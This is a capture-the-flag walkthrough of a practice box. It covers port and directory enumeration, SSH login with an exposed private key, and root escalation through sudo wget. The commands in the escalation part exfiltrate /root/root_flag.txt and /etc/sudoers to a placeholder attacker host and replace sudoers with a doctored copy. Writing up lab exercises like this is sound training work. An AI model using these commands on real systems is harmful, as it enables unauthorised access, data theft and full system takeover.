Have fun with this easy box.

Let's begin our enumeration with nmap.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/wgel-ctf/nmap.png)

As we can see there are two open ports 22 SSH and 80 HTTP. Go and visit the website.

![website](/assets/images/thm/wgel-ctf/website.png)

It's Apache default page. Let's run directory scan to find any hidden directories.

```
gobuster dir -u http://10.10.22.10 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster](/assets/images/thm/wgel-ctf/gobuster-sitemap.png)

We have found `sitemap` directory. Let's visit it.

![sitemap](/assets/images/thm/wgel-ctf/sitemap.png)

I tried some additional directory search.

```
gobuster dir -u http://10.10.22.10/sitemap -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

![gobuster-sitemap](/assets/images/thm/wgel-ctf/gobuster-sitemap.png)

hmm this `.ssh` directory looks suspicious

![ssh](/assets/images/thm/wgel-ctf/ssh.png)

Now we have rsa key but we need username as well. Go back to the Apache default page and look the source code.

![source](/assets/images/thm/wgel-ctf/source.png)

Oh... hello Jessie

```
ssh -i id_rsa jessie@10.10.22.10
```

![jessie](/assets/images/thm/wgel-ctf/jessie.png)

We have succefully logged as jessie. Look through the jessie directory and find the user flag. <br/>

Once we find the user flag we need to escalate our privileges. Let's check what we can find with `sudo -l` command

![sudo-l](/assets/images/thm/wgel-ctf/sudo-l.png)

Our user is able to run `wget` command as root. Go and visit <https://gtfobins.github.io/gtfobins/wget/> to see how we can take and advantage of the command. <br/>

As we know the user flag is named user_flag.txt so probably root flag is named root_flag.txt which means we should be able to read the file with the following command

```
sudo wget -i /root/root_flag.txt
```

![wget-read](/assets/images/thm/wgel-ctf/wget-read.png)

I also tried to upload the file on my machine. First set listener.

```
nc -lvnp <PORT>
```

```
sudo wget --post-file=/root/root_flag.txt http://<YOUR_MACHINE>:<PORT>
```

Unfortunately both of the tries didn't work for me. Not sure why...

Another thing that we can try is to recieve `/etc/sudoers` and change the permission of our user to be able to execute any sudo commands. Using wget we'll be able to upload and replace the original file with our manipuleted one. Let's try it.

Start listener on your machine

```
nc -lvnp <PORT>
```

```
sudo wget --post-file=/etc/sudoers <YOUR_IP>:<PORT>
```

![sudoers](/assets/images/thm/wgel-ctf/sudoers.png)

Now we have the sudoers content, create sudoers file and change the jessie rights to be able to execute all sudo commands without a password.

![sudoers-change](/assets/images/thm/wgel-ctf/sudoers-change.png)

Now start python server on your machine

```
python3 -m http.server
```

On the target machine navigate to `/etc` and download the new sudoers file

```
sudo wget http://<YOUR_IP>:<PORT>/sudoers --output-document=sudoers
```

or

```
sudo wget http://<YOUR_IP>:<PORT>/sudoers -O sudoers
```

Check the rights

```
sudo -l
```

![check](/assets/images/thm/wgel-ctf/check.png)

Now we are able to run any command as root. Let's try it out.

```
sudo /bin/bash
```
![root](/assets/images/thm/wgel-ctf/root.png)
